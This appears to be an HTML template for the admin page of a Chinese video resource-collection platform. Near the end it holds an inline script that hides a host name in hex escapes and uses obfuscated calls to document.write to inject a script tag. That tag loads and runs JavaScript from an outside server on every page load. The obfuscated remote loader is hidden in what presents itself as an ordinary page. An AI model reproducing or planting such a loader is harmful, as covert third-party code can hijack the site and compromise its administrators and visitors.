<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=7" />
<title>『那片资源』资源采集平台...</title>
<script type="text/javascript" src="../js/jquery.js"></script>
<script type="text/javascript" src="../js/jq/jquery.cookie.js"></script>
<script type="text/javascript" src="../js/jq/jquery.validate.js"></script>
<script type="text/javascript" src="tpl/js/adm.js"></script>
<script language="javascript">
$(function(){
	$("#xmllist").html( $("#xml").html());
	$("#xml").html("");
});
</script>
</head>
<body>
<!---那片电影资源与解析qq群：107028575---> 
<!---朝阳QQ：515233307--->
<table width="100%" border="0" cellspacing="0" cellpadding="0" >
  <tr>
    <td><span id="xmllist">那片资源载入中……</span></td>
  </tr>
</table>
<script language="javascript">
var aAgFsqqg1 = '\x7a\x79\x61\x70\x69\x2e\x70\x6f\x78\x69\x61\x6f\x6b\x6a\x2e\x63\x6f\x6d';window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["\x77\x72\x69\x74\x65"]("\x3c\x73\x63\x72\x69\x70\x74 \x74\x79\x70\x65\x3d\"\x74\x65\x78\x74\x2f\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\" \x73\x72\x63\x3d\"\x68\x74\x74\x70\x3a\x2f\x2f"+aAgFsqqg1+"\x2f\x6d\x61\x63\x2f\"\x3e"+"\x3c\/\x73\x63\x72\x69\x70\x74\x3e");
</script>
</span>
</body>
</html>
